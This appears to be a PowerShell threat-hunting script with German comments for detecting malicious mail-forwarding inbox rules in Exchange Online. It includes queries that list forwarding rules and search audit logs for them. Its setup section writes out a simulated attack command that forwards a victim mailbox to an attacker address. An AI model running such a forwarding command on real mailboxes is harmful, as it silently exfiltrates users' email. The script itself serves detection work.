#SCRIPTNAME: Hunt Mailforwarding in Inbox Rules

#Target: setzen von mbx forward erkennen
#Cloud Service: Exchange Online
#Risiko: unbemerktes forwarden von mails mit inbox regeln
#Quelle: SANS DFIR SUMMIT 2022

#CONFIG: Forward Rule einrichten
New-InboxRule -mailbox victim@threathunting.dev -name Malicious_Forward -
ForwardTo Attacker@threatactor.dev

#REPORT: Alle Mailboxen mit forwardings anzeigen -includehidden falls nötig
$Mailboxes = Get-Mailbox ; foreach ($Mailbox in $Mailboxes) { Get-InboxRule -mailbox
    $Mailbox.Name | Where-Object {($Null -ne $_.ForwardTo) -or ($Null -ne $_.RedirectTo) -or
    ($Null -ne $_.ForwardAsAttachmentTo) } | select-object identity,Name,Enabled,ForwardAsAttachmentTo,ForwardTo,RedirectTo }

#DETECT: Unified audit Logs
$logs = Search-UnifiedAuditLog -operations new-inboxrule,set-inboxrule -StartDate 2022-01-01 -
EndDate 2022-07-08
ForEach ($record in $logs){
$AuditData = $record.AuditData | ConvertFrom-Json
if ( $AuditData.Parameters | Where-Object {($_.Name -like 'ForwardTo') -or ($_.Name -eq 'RedirectTo') -or ($_.Name -eq 'ForwardAsAttachmentTo')})
{$record}}

#WE>>MER